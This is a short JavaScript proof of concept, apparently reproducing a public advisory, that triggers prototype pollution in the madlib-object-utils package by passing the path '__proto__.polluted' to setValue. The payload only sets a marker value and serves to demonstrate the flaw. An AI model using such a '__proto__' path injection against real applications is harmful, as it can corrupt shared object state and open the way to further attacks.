//https://snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676
  const objectUtils = require("madlib-object-utils");
  objectUtils.setValue("__proto__.polluted", {}, "yes");
